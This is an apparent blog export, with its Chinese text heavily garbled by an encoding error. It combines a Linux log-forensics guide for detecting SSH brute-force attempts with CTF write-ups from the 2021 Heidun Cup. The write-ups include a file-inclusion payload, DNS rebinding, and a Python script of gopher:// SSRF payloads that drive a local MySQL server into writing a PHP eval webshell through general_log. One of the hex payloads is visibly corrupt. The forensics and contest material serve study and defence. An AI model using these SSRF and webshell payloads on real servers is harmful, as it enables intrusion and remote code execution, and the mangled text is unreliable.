è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯çš„æ—¥å¿—ã€‚è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ä¼šè®°å½•Linuxç³»ç»Ÿçš„ç»å¤§å¤šæ•°é‡è¦ä¿¡æ¯ï¼Œå¦‚æœç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶ï¼Œé¦–å…ˆè¦æ£€æŸ¥çš„å°±åº”è¯¥æ˜¯è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ /var/log/btmp è®°å½•é”™è¯¯ç™»å½•æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viæŸ¥çœ‹ï¼Œè€Œè¦ä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹ /var/log/lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹ /var/log/wtmp æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„å¯åŠ¨ã€é‡å¯ã€å…³æœºäº‹ä»¶ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸èƒ½ç›´æ¥viï¼Œè€Œéœ€è¦ä½¿ç”¨lastå‘½ä»¤æ¥æŸ¥çœ‹ /var/log/utmp è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™ä¸ªæ–‡ä»¶ä¼šéšç€ç”¨æˆ·çš„ç™»å½•å’Œæ³¨é”€ä¸æ–­å˜åŒ–ï¼Œåªè®°å½•å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯ã€‚åŒæ ·è¿™ä¸ªæ–‡ä»¶ä¸èƒ½ç›´æ¥viï¼Œè€Œè¦ä½¿ç”¨w,who,usersç­‰å‘½ä»¤æ¥æŸ¥è¯¢ /var/log/secure è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œåªè¦æ¶‰åŠè´¦å·å’Œå¯†ç çš„ç¨‹åºéƒ½ä¼šè®°å½•ï¼Œæ¯”å¦‚SSHç™»å½•ï¼Œsuåˆ‡æ¢ç”¨æˆ·ï¼Œsudoæˆæƒï¼Œç”šè‡³æ·»åŠ ç”¨æˆ·å’Œä¿®æ”¹ç”¨æˆ·å¯†ç éƒ½ä¼šè®°å½•åœ¨è¿™ä¸ªæ—¥å¿—æ–‡ä»¶ä¸­ ä¸»æœºæ—¥å¿—åˆ†ææŸ¥çœ‹ç™»å½•å¤±è´¥ä¿¡æ¯ grep -o &quot;Failed password&quot; /var/log/secure|uniq -c è¾“å‡ºç™»å½•çˆ†ç ´çš„ç¬¬ä¸€è¡Œå’Œæœ€åä¸€è¡Œï¼Œç¡®è®¤çˆ†ç ´æ—¶é—´èŒƒå›´ grep &quot;Failed password&quot; /var/log/secure|head -1 grep &quot;Failed password&quot; /var/log/secure|tail -1 æŸ¥çœ‹æœ‰å“ªäº›IPåœ¨çˆ†ç ´rootå¸å· grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more è¾“å‡ºæœ‰çˆ†ç ´è¡Œä¸ºçš„IP grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c è¾“å‡ºè¢«çˆ†ç ´çš„ç”¨æˆ·å grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\\n&quot;;}'|uniq -c|sort -nr æŸ¥çœ‹ç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IP grep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' æŸ¥çœ‹å“ªäº›IPç™»å½•æˆåŠŸäº† grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more webæ—¥å¿—åˆ†æå…ˆç»Ÿè®¡è¯·æ±‚ipï¼Œæ–¹ä¾¿åç»­åˆ†æï¼ˆå–å‡ºæ—¥å¿—å¯ç”¨szå‘½ä»¤æˆ–è€…xftpï¼‰ awk '{print $1}' blog.m1kh.com.log | sort | uniq -c | sort -rn | moreawk '{print $1}' blog.m1kh.com.log | sort | uniq -c | sort -rn &gt; ç»Ÿè®¡ä¸‹æ—¥å¿—æœ‰å¤šå°‘è¡Œ wc -l blog.m1kh.com.log #-lç»Ÿè®¡è¡Œæ•°cat -n blog.m1kh.com.log | tail -1 çŠ¶æ€ç ç»Ÿè®¡ cat blog.m1kh.com.log |awk '{print $9}'|sort|uniq -c|sort -rn URL ç»Ÿè®¡ï¼ˆ200ï¼‰ grep &quot;183.6.56.66&quot; blog.m1kh.com.log | awk '{if ($9==200) print $1,$7,$9}' æŸ¥çœ‹å¹¶ç»Ÿè®¡200çš„çŠ¶æ€ç åŠipï¼ˆå»é‡åï¼‰ cat blog.m1kh.com.log | awk '{if ($9=200) print $1,$7,$9}'|sort|uniq -c|sort -rn | head -20 æœ‰æ—¶å€™é‡åˆ°ç›®å½•æ‰«æä¼šäº§ç”Ÿå¤§é‡æ—¥å¿—ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ†å¼€çœ‹ï¼Œå¯ç”¨awkè¿›è¡Œåˆ†å‰²ï¼Œåªçœ‹çŠ¶æ€ç ä¸º200çš„ã€‚ more blog.m1kh.com.log | egrep &quot;\\.zip|\\.rar|\\.mdb|\\.inc|\\.sql|\\.config|\\.bak|/login.inc.php|/.svn/|/mysql/|config.inc.php|\\.bak|wwwroot|ç½‘ç«™å¤‡ä»½|/gf_admin/|/DataBackup/|/Web.config|/web.config|/1.txt|/test.txt|www.zip|www.tar&quot; &gt; test.log[root@m1kh wwwlogs]# more test.log | awk '{if($9==200) {print $1,$2,$3,$4,$6,$7,$8,$9}}'183.6.56.66 - - [12/Apr/2021:18:14:44 &quot;GET /config.inc.php HTTP/2.0&quot; 200183.6.56.66 - - [12/Apr/2021:18:14:45 &quot;GET /config.inc.php HTTP/2.0&quot; 200 æ‚é¡¹å¼€æœºå¯åŠ¨çš„ä¸€äº›è·¯å¾„ /etc/rc.d/rc/etc/rc/etc/rc.local/etc/rc.d/rc.local/etc/rc.d/rc/etc/rc$runlevel.d/ è¯¥ç›®å½•ä¸‹éƒ½æ˜¯é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥è‡ªå·±æ·»åŠ å¯æ‰§è¡Œç¨‹åº/etc/ld.so.cache /etc/ld.so.preload /usr/local/lib/libioset.so/etc/init.då¦å¤–ä¸€ä¸ªæ·»åŠ å¯åŠ¨é¡¹çš„åœ°æ–¹åœ¨ /etc/profileé‡Œé¢ï¼Œè¿˜æœ‰ /etc/profile.d/ç›®å½•ä¸‹ä»¥shç»“å°¾çš„æ–‡ä»¶ grepæŒ‡ä»¤2ã€grep æŸ¥æ‰¾å«æœ‰æŸå­—ç¬¦ä¸²çš„æ‰€æœ‰æ–‡ä»¶ grep -rn &quot;hello,world!&quot; * : è¡¨ç¤ºå½“å‰ç›®å½•æ‰€æœ‰æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªæ–‡ä»¶å-r æ˜¯é€’å½’æŸ¥æ‰¾-n æ˜¯æ˜¾ç¤ºè¡Œå·-R æŸ¥æ‰¾æ‰€æœ‰æ–‡ä»¶åŒ…å«å­ç›®å½•-i å¿½ç•¥å¤§å°å†™ 4ã€find /etc -name init //åœ¨ç›®å½•/etcä¸­æŸ¥æ‰¾æ–‡ä»¶init Aã€/var/log/secure1ã€å®šä½æœ‰å¤šå°‘IPåœ¨çˆ†ç ´ä¸»æœºçš„rootå¸å·ï¼š grep &quot;Failed password for root&quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | moreå®šä½æœ‰å“ªäº›IPåœ¨çˆ†ç ´ï¼šgrep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -cçˆ†ç ´ç”¨æˆ·åå­—å…¸æ˜¯ä»€ä¹ˆï¼Ÿ grep &quot;Failed password&quot; /var/log/secure|perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\\n&quot;;}'|uniq -c|sort -nr2ã€ç™»å½•æˆåŠŸçš„IPæœ‰å“ªäº›ï¼š grep &quot;Accepted &quot; /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | moreç™»å½•æˆåŠŸçš„æ—¥æœŸã€ç”¨æˆ·åã€IPï¼šgrep &quot;Accepted &quot; /var/log/secure | awk '{print $1,$2,$3,$9,$11}' 3ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼šJul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali#grep &quot;useradd&quot; /var/log/secure 4ã€åˆ é™¤ç”¨æˆ·kaliæ—¥å¿—ï¼šJul 10 00:14:17 localhost userdel[2393]: delete user 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali'Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali'# grep &quot;userdel&quot; /var/log/secure5ã€suåˆ‡æ¢ç”¨æˆ·ï¼šJul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudoæˆæƒæ‰§è¡Œ:sudo -lJul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now","link":"/2021/12/03/%E8%93%9D%E9%98%9F%E6%97%A5%E5%BF%97%E6%BA%AF%E6%BA%90/"},{"title":"2021hitcon","text":"å‰è¨€æ­£å¥½é‡ä¸Šé»‘ç›¾æ¯æ¯”èµ›ï¼Œæ‰€ä»¥å°±æ²¡æ‰“äº†ï¼Œä½†æ˜¯é¢˜ç›®è‚¯å®šè¿˜æ˜¯è¦å¤ç°çš„ï¼Œæ¯•ç«Ÿæ˜¯å›½é™…é‡é‡çº§çš„æ¯”èµ›ã€‚ one-bit-man","link":"/2021/12/09/2021hitcon/"},{"title":"2021é»‘ç›¾æ¯","text":"\\dnsåè®®**ä¸‹è½½ä¸‹æ¥å¾—åˆ°ä¸€é˜Ÿ01æ–‡ä»¶ï¼ŒçŒœæµ‹æ˜¯ç”»å›¾é¢˜from PIL import Image import matplotlib.pyplot as plt Loca_img = Image.new(â€˜RGBâ€™,(500,500),(255,255,255)) with open(â€˜dddd.txtâ€™,â€râ€) as f: f=f.read()[::-1] x,y =Loca_img.size cnt = 0 for i in range(y): â€‹ for j in range(x): â€‹ if f[cnt]==â€™0â€™: â€‹ Loca_img.putpixel((i,j),(0,0,0)) â€‹ cnt+=1 plt.imshow(Loca_img) plt.show() Loca_img.save(â€˜flag.pngâ€™) å¾—åˆ°flagå›¾ç‰‡ï¼Œä¸Šé¢ç¼ºäº†ä¸€ä¸ªè§’ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“ï¼Œé‚£ä¸ªæ˜¯å®šä½è§’ï¼Œéƒ½æ˜¯ä¸€æ ·çš„ï¼Œåœ¨psé‡Œé¢å§æ—è¾¹é‚£ä¸ªæ ¼å­è¡¥è¿‡å»å°±è¡Œäº†ï¼Œç„¶åæ‰«ç å¾—åˆ°flagflag{5E57527B60} \\æ—¥å¿—åˆ†æ** å¾ˆæ˜æ˜¾æ˜¯sqlç›²æ³¨çš„æµé‡ï¼ŒæŠŠä»–urldecodeä¸€ä¸‹ï¼Œ å¯ä»¥çœ‹åˆ°675çš„é•¿åº¦æ‰æ˜¯æ­£ç¡®çš„ï¼Œç„¶åå¯¹å…¶è¿›è¡Œasciiç å¯¹ç…§ä¸€ä¸‹å¯ä»¥å¾—åˆ°ngjfdsUbdK \\dnsåè®®** ä¸€å¼€å§‹åœ¨wiresharké‡Œé¢çœ‹ï¼Œæ²¡çœ‹åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œå¡äº†æœ‰ç‚¹ä¹…ï¼Œå°±å»kalié‡Œé¢ç›´æ¥æŠŠæ‰€æœ‰å†…å®¹åˆ—å‡ºæ¥äº† å¾ˆæ˜æ˜¾ï¼Œç›´æ¥çœ‹åˆ°ä¸€ä¸²ç±»ä¼¼base64åŠ å¯†çš„ä¸œè¥¿ï¼Œè§£ç ä¸€ä¸‹å°±æ‹¿åˆ°flagäº† \\Decode**çœ‹åˆ°pkå¤´äº†ï¼Œåˆçœ‹åˆ°decode.txtï¼Œåˆ†ä¸€ä¸‹ï¼Œå°±å¯ä»¥æ‹¿åˆ° å°è¯•GCDå‡½æ•°ï¼Œå‘ç°å¯è¡Œ import libnum n1 = 15228664629164509105936278301396170708905691970126305196584505186788860519598413718493859625462561931380632032431490419378905593909771649295663481782473029836321132574188559245931660756414915507930357509270674460219615256962333464689419869130366867401404262606367700782040693275068101244535880649261286041921882470460606034302142183971677715439862839410834231609821777031530457674591868138859358815039755085358568037032478394036448363183057305077227769673701227083943898736796552550712057417053897722979700329662099072959306298177351997084389916443815546425080826441671985030755256185725913397986385179516049927425591 n2 = 28182418532443955655250943929828439725377604572088962537896240628709829618999901367131159759359513146864646169253348651905865895468151210748207509325666501438590382812326109260537618829438786609626137074778638549998280533912080708785604673270460635181275360847313985764185991865570533815651261638439461846512012164531330949433517277559149828806588070421852157781670188281908625986974579194819272643409859915715455134433970119584552350648013116998668938513347083566970423327936691885137812528912263666957628197241313496232397910546498542303925205356813548741679943691886217742767778075067797422624969714343428365022749 n3 = 18355811159408154065817199279776805621878757240392366715869421799780946779485225342662736231980532326015283372375030686507311099745671828649419794838611580909610100636296701054995302819692794479292794716441442731393027118795245239019609474743841061251498233337758043553376098591254587406941205804917663153256036922860462415387926973551020540123742773938055950168965005226319984869124543783579240130888344231027912143592472823564266887957101575622993773291455143915263715932280728961208233983782906070719786115187115449430196335973764600533097718947377609348244073036523422892353195107093782201003551217830556519184839 e1 = 65537 e2 = 27751 e3 = 65537 c1 = 5368342382489380107251269030258282008067103595899117880173297169710980852124379736420135829984131832023988667774795223808420069001078159756328642298736759964890517323144475742861501409284299556459601222657540302786301791897975932176538612601162552795835603779910738886150925504885639254302406755008796950704938463132687940418772021406619622090999564746948113296328739593309200238996686945891130656599419832796482095787039339269564880847130379179831744694000940207887150388411084465949903406848727641093033681144598595895383689139227400553234701993087147186292040330589331703587405822925483701667354935313494938769206 c2 = 21521672635651854919517759696514027081496995002884626306313384597771682621826437868933822942195279941318573525337109548152966094293276717095298929811895186384560362917891928656637913236676702009205642367801075592458101830488916914437754803979953027152373619293870115731171449223105986403604973873007338969000153480949617700626516389419935352576014084068271819009465242491467427642787306345049280205827574043586767133396458785487959251540831856187380154825027964867977651727983254127239427622549059938701125498520279503972702883327594442747467858234391945790597844344295786118320620376681461727686876948563884520137741 c3 = 13940747781246179701167820858098775936269078279837839169409057305686612176371099274767269714494905207551971162649902129137425806839867713157472497469542260664882313041602553845621113546259276402534229231780532278276697961222319054833980226978574905974878218905613341365260453461080117407529132948986104191917111000811731784483944945364091757083949827612260904757837644538366763161154611658652020868326985526984718638276184626634240096213703958275241215175054246685206226179114590838833694648062135027841593419815101363262701960507235056752424778384286627997500871204804629047307688466887868894491042058198480775705486 p1 = libnum.gcd(n1,n2) p3 = libnum.gcd(n2,n3) def get_flag(c,n,e,p): #p2 = p1 q = n//p phi = (p-1)*(q-1) d = libnum.invmod(e,phi) flag = libnum.n2s(pow(c,d,n)) return flag if name==â€mainâ€œ: get_flag(c1,n1,e1,p1) åˆ†åˆ«æ‹¿åˆ°ä¸‰ç»„flag ç„¶ådecodeç»„åˆä¸€ä¸‹ å°±æ‹¿åˆ°flagäº† \\åœ¨çº¿ç”µåŠ›æ§åˆ¶ç³»ç»Ÿæ¶ˆæ¯ä¼ é€**ä¸€å¼€å§‹ç”¨ssrfæµ‹è¯•çš„ï¼Œå‘ç°å¥½åƒä¸å¤ªå¯¹ ä»–éœ€è¦æœ‰ä¸ªdianli.comåœ¨å¼€å¤´ï¼Œç»§ç»­å¾€ä¸‹çœ‹ï¼Œå‘ç°å§httpå»æ‰ä¾æ—§å¯ä»¥ï¼Œ å‘ç°æ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œï¼Œåœ¨æµ‹è¯•äº†ä¸€ä¸‹ï¼ŒåŸæ¥æ˜¯/flag.txt \\myTemplate**è¿˜å¥½www.zipæœ‰æºç ï¼Œæ‰€ä»¥ç›´æ¥å®¡è®¡æºç å°±è¡Œ public function render(){ â€‹ extract($this-&gt;data); â€‹ if (!isset($file)) { â€‹ $content = file_get_contents($this-&gt;templte_file); â€‹ }else{ â€‹ $content = file_get_contents($file); â€‹ } â€‹ eval(â€˜?&gt;â€™ . $content); } è¿™ä¸ªæ¼æ´å¤ªæ˜æ˜¾äº†ï¼Œfile_get_contentsï¼Œè€Œä¸”è¾“å…¥å¯æ§ æ‹ä¸€ä¸‹æ€è·¯ï¼Œé¦–å…ˆæ˜¯fileè¿™ä¸ªå‚æ•°ä¼šè¢«è¯»å–ï¼Œç„¶åå®ƒä½¿ç”¨äº†extractå‡½æ•°==ï¼Œé‚£æˆ‘ä»¬ç›´æ¥urlä¼ å…¥ä¸€ä¸ªfileå€¼ï¼Œå°±ä¼šè¢«è¿™ä¸ªæ¨¡æ¿ç»™æ¸²æŸ“äº†ï¼Œæ¥ä¸‹æ¥å°±ä¼šåœ¨åé¢çš„é¡µé¢è¢«è§£æäº† Payload admin.php?file=/flag.php \\ICS-Modbusçš„ç§˜å¯†**å­—ç¬¦ä¸²æœç´¢ï¼Œç›´æ¥å‡ºflag \\Magiccurl**é€šè¿‡dnsé‡ç»‘å®šç»•è¿‡å¯¹è¯·æ±‚ipçš„é™åˆ¶ https://lock.cmpxchg8b.com/rebinder.html éœ€è¦å¤šæ¬¡è¯·æ±‚ï¼Œä¸€ç›´åˆ°è¯»å‡ºå¯†ç ä¸ºæ­¢ï¼Œå¾—åˆ°å¯†ç  http://39.104.66.84:12460/index.php?url=http://7f000001.01010101.rbndr.us/admin.php ``` DssT2M2cjDNKaew ``` æ¥ä¸‹æ¥åˆ©ç”¨gopheråè®®æ”»å‡»æœ¬åœ°mysqlï¼Œé€šè¿‡å¯¼å‡ºgeneral_logæ–‡ä»¶æ¥getshell è¦æ‰§è¡Œçš„sqlè¯­å¥ ``` set global general_log = â€œONâ€; set global general_log_file=â€/var/www/html/1.phpâ€; select â€˜â€˜; ``` ç”¨gopherusç”Ÿæˆpayloadï¼Œç„¶åç”¨è„šæœ¬å‘é€ ``` import requests url=â€http://39.104.66.84:12460/&quot; data={ â€œpasswordâ€:â€DssT2M2cjDNKaewâ€, #â€œurlâ€:â€dict://127.0.0.1:3306â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%24%00%00%00%03%53%48%4f%57%20%47%52%41%4e%54%53%20%46%4f%52%20%27%74%65%73%74%27%40%27%6c%6f%63%61%6c%68%6f%73%74%27%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%27%00%00%00%03%73%68%6f%77%20%67%6c%6f%62%61%6c%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%27%25%73%65%63%75%72%65%25%27%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%52%00%00%00%03%63%72%65%61%74%65%20%66%75%6e%63%74%69%6f%6e%20%73%79%73%5f%65%76%61%6c%20%72%65%74%75%72%6e%73%20%73%74%72%69%6e%67%20%73%6f%6e%61%6d%65%20%27%2f%76%61%72%2f%6c%69%62%2f%6d%79%73%71%6c%2d%66%69%6c%65%73%2f%6d%79%73%71%6c%75%64%66%2e%73%6f%27%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%73%65%6c%65%63%74%20%73%79%73%5f%65%76%61%6c%28%27%6c%73%20%2f%27%29%3b%01%00%00%00%01â€ # #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%20%00%00%00%03%73%68%6f%77%20%76%61%72%69%61%62%6c%65%73%20%6c%69%6b%65%20%27%67%65%6e%65%72%61%6c%25%27%3b%01%00%00%00%01â€ â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%23%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%6s1%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%34%00%00%00%03%73%65%74%20%67%6c%6f%62%61%6c%20%67%65%6e%65%72%61%6c%5f%6c%6f%67%5f%66%69%6c%65%3d%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%20%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1f%00%00%00%03%73%65%74%20%67%6c%6f%62%61%6c%20%67%65%6e%65%72%61%6c%5f%6c%6f%67%20%3d%20%22%4f%4e%22%3b%01%00%00%00%01â€ #â€œurlâ€:â€gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%15%00%00%00%03%75%73%65%20%63%74%66%3b%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01â€ 